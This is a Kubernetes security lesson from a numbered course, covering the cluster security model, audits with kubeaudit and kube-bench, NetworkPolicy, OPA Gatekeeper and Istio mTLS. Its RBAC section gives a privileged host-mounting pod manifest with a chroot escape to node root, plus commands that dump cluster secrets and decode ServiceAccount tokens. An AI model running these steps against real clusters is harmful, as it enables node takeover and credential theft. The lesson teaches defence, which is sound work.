---
title: "Day 743 — Cloud-Native Security: Kubernetes, Service Mesh, and Beyond"
tags: [cloud-native, kubernetes, k8s-security, service-mesh, istio,
  opa, pod-security, rbac-abuse, module-12-post-gate]
module: 12-PostGate
day: 743
prerequisites:
  - Day 742 — Advanced Rootkits and UEFI Implants
  - Day 527 — Kubernetes Security (Module 08)
  - Day 528 — Container Escape Lab (Module 08)
related_topics:
  - Day 744 — Zero Trust Architecture
---

# Day 743 — Cloud-Native Security: Kubernetes, Service Mesh, and Beyond

> "Kubernetes broke the network perimeter in the most complete way possible.
> There is no 'inside' and 'outside' anymore — every pod has a unique IP,
> every service talks to every other service, and the blast radius of a
> single compromised container is the entire cluster if RBAC is misconfigured.
> Cloud-native security is not 'container security' — it is re-learning
> what network security means when the network changes every 30 seconds."
>
> — Ghost

---

## Goals

1. Understand the Kubernetes security model beyond basic RBAC: Pod Security
   Admission, Network Policies, and Admission Controllers.
2. Audit a Kubernetes cluster for misconfiguration using kubeaudit and kube-bench.
3. Understand service mesh security (Istio/Linkerd) and mTLS between pods.
4. Implement Open Policy Agent (OPA) Gatekeeper to enforce security constraints.
5. Map common Kubernetes attack paths to MITRE ATT&CK.

---

## Prerequisites

- Days 527–528 (Kubernetes Security, Container Escape).
- Access to a Kubernetes cluster (minikube or kind for lab work).

---

## 1 — Kubernetes Security Model: Complete View

```
KUBERNETES SECURITY LAYERS

1. API SERVER AUTHENTICATION:
   Who can connect to the API server?
   Methods: X.509 certificates, ServiceAccount tokens, OIDC, webhook tokens
   Attack: stolen ServiceAccount token → access as that SA's permissions

2. RBAC AUTHORISATION:
   What can authenticated principals do?
   Attack paths:
     ClusterAdmin role → everything
     Wildcard verbs (get, list, watch *) → read all secrets
     create pods → escalate via pod creation (see below)
     escalate/bind verbs on roles → self-escalation

3. ADMISSION CONTROLLERS:
   What pod configurations are allowed?
   ValidatingWebhookConfiguration: reject dangerous configs
   MutatingWebhookConfiguration: modify pod specs before creation
   Attack: misconfigured webhook → bypass security policies

4. NETWORK POLICIES:
   What can pods talk to?
   Default Kubernetes: all pods can talk to all pods (NO isolation)
   NetworkPolicy resource: explicit allow rules
   Attack path: pod compromise → lateral movement to all other pods
   (if no NetworkPolicy defined — the majority of clusters)

5. POD SECURITY:
   What can containers do on the node?
   PSA (Pod Security Admission) — Kubernetes native since 1.23:
     privileged: no restrictions (dangerous)
     baseline: some restrictions
     restricted: strong restrictions (requires non-root, seccomp, etc.)
   Attack: privileged pod → node escape → cluster-admin
```

---

## 2 — RBAC Privilege Escalation Paths

### 2.1 Pod Creation → Node Escape

If a principal can `create pods`, they can create a privileged pod:

```yaml
# privilege_escalation_pod.yaml — DO NOT USE OUTSIDE LAB
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  hostPID: true          # see all processes on the host
  hostNetwork: true      # host network namespace
  hostIPC: true          # host IPC namespace
  volumes:
    - name: host-root
      hostPath:
        path: /           # mount the ENTIRE host filesystem
  containers:
    - name: attacker
      image: ubuntu
      command: ["/bin/bash", "-c", "sleep infinity"]
      securityContext:
        privileged: true  # full capabilities including CAP_SYS_ADMIN
      volumeMounts:
        - name: host-root
          mountPath: /host-root
```

**With this pod running:**
```bash
kubectl exec attacker-pod -- chroot /host-root /bin/bash
# Now on the node as root, with access to:
# - All container filesystems
# - The kubelet config (with node credentials)
# - The host network
# - Docker/containerd socket
```

### 2.2 Secret Read → Cloud Credentials

```bash
# If RBAC allows: get secrets across all namespaces
kubectl get secrets -A -o json | \
    jq '.items[] | select(.type=="kubernetes.io/service-account-token"
                          or .metadata.annotations["eks.amazonaws.com/role-arn"]
                          != null) | .metadata.name'

# Extract a ServiceAccount token:
kubectl get secret <sa-token-name> -o jsonpath='{.data.token}' | base64 -d
# Use as Bearer token to call the API server as that ServiceAccount

# If the ServiceAccount has a cloud IAM annotation (EKS IRSA):
# The token can be exchanged for cloud credentials
# → AWS: assume the annotated IAM role
# → Full cloud account compromise if the role has broad permissions
```

---

## 3 — Cluster Audit with kubeaudit and kube-bench

```bash
# kubeaudit — audit a cluster for security misconfigurations
# Install: https://github.com/Shopify/kubeaudit

kubeaudit all              # check all controls for current cluster context
kubeaudit image            # check for latest tag usage (not pinned images)
kubeaudit privileged       # find privileged pods
kubeaudit nonroot          # find pods running as root
kubeaudit netpols          # find namespaces with no NetworkPolicy
kubeaudit rbac             # check RBAC misconfiguration

# kube-bench — CIS Kubernetes Benchmark audit
# Runs on the cluster node; checks against CIS benchmark
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs job/kube-bench

# Key findings to look for in kube-bench output:
# [WARN] 1.2.9 Ensure that the --authorization-mode argument includes RBAC
# [FAIL] 4.2.6 Minimize the admission of containers with runAsUser=0
# [WARN] 5.2.2 Minimize the admission of privileged containers
```

---

## 4 — Network Policy: Micro-Segmentation

```yaml
# network_policy_example.yaml — implement proper pod isolation

# Default deny all ingress in the app namespace:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: app
spec:
  podSelector: {}     # applies to ALL pods in namespace
  policyTypes:
    - Ingress
  # No ingress rules → deny all by default
---
# Allow only the frontend to talk to the backend:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: app
spec:
  podSelector:
    matchLabels:
      app: backend          # applies to backend pods
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend  # only frontend pods can reach backend
      ports:
        - protocol: TCP
          port: 8080
```

---

## 5 — Open Policy Agent (OPA) Gatekeeper

OPA Gatekeeper is a Kubernetes admission controller that enforces custom
policies using Rego (OPA's policy language).

```bash
# Install OPA Gatekeeper:
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml

# Create a Constraint Template: "pods must not use latest image tag"
cat << 'EOF' | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdisallowlatestimage
spec:
  crd:
    spec:
      names:
        kind: K8sDisallowLatestImage
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdisallowlatestimage

        violation[{"msg": msg}] {
            container := input.review.object.spec.containers[_]
            endswith(container.image, ":latest")
            msg := sprintf("Container '%v' uses ':latest' image tag", [container.name])
        }
EOF

# Apply the Constraint (enforce it):
cat << 'EOF' | kubectl apply -f -
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDisallowLatestImage
metadata:
  name: disallow-latest-image
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
EOF

# Test: try to create a pod with :latest → should be rejected:
kubectl run test --image=nginx:latest
# Error: admission webhook "validation.gatekeeper.sh" denied the request:
#   Container 'test' uses ':latest' image tag
```

---

## 6 — Service Mesh Security: Istio mTLS

```yaml
# Enforce strict mTLS between all pods in the mesh
# No pod can communicate without a valid certificate

apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system    # cluster-wide policy
spec:
  mtls:
    mode: STRICT             # STRICT = require mTLS; reject plaintext

# Verify mTLS is working:
# kubectl exec -it <pod> -- curl http://other-service/api
# Should fail without certificate (plaintext rejected)

# AuthorizationPolicy: allow only specific pods to talk to each other
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: frontend-only
  namespace: app
spec:
  selector:
    matchLabels:
      app: backend
  rules:
    - from:
        - source:
            principals:
              - "cluster.local/ns/app/sa/frontend-sa"   # only frontend ServiceAccount
      to:
        - operation:
            methods: ["GET", "POST"]
            paths: ["/api/*"]
```

---

## Key Takeaways

1. **Kubernetes default state is zero network isolation.** Unless Network
   Policies are explicitly deployed, every pod can reach every other pod on
   every port. A compromised pod in the default configuration has the entire
   cluster network as its lateral movement surface. Micro-segmentation via
   NetworkPolicy is mandatory, not optional.
2. **Pod creation → node escape is the highest-risk RBAC misconfiguration.**
   Any principal that can create pods with `hostPath` or `privileged: true`
   effectively has root on the node and can read all other pods' secrets from
   `/var/lib/kubelet/pods/`. Audit who can create pods.
3. **OPA Gatekeeper enforces custom policies that Kubernetes admission
   controllers cannot.** The CIS Kubernetes Benchmark cannot be fully
   implemented with native Kubernetes controls — Gatekeeper closes the gap
   with programmable policy as code.
4. **Istio mTLS shifts the trust model from network location to identity.**
   Without a service mesh, trust is based on network adjacency (a pod in the
   cluster can talk to any pod). With mTLS, trust is based on cryptographic
   identity (only pods with a valid certificate matching an AuthorizationPolicy
   can communicate). This is the foundation of zero trust within a cluster.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q743.1, Q743.2 …).

---

## Navigation

← Previous: [Day 742 — Advanced Rootkits and UEFI Implants](DAY-0742-Advanced-Rootkits-UEFI.md)
→ Next: [Day 744 — Zero Trust Architecture](DAY-0744-Zero-Trust-Architecture.md)
